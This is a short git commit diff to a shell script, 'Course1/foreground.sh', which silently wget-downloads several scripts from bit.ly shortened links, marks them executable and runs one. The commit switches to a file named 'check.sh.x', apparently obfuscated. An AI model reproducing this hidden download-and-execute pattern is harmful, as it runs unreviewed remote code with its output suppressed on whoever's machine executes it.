041255c5066d7aa8de3f7c81d22bce26f441d6ab
Nguyen Thuong Hai <58414694+kmille36@users.noreply.github.com>
2021-07-25 01:06:50 +0700

    Update foreground.sh

--- Course1/foreground.sh
+++ Course1/foreground.sh
@@ -5,10 +5,10 @@ wget -O sleep.sh https://bit.ly/3zzuJJh > /dev/null 2>&1
 clear
 wget -O win8vm.sh https://bit.ly/3kR1M7R > /dev/null 2>&1
 clear
-wget -O check.sh https://bit.ly/3rz3DPH > /dev/null 2>&1
+wget -O check.sh.x https://bit.ly/3kTpvUD > /dev/null 2>&1
 clear
 chmod +x win8vm.sh
-chmod +x check.sh
+chmod +x check.sh.x
 chmod +x exit.sh
 chmod +x sleep.sh
-./check.sh
+./check.sh.x
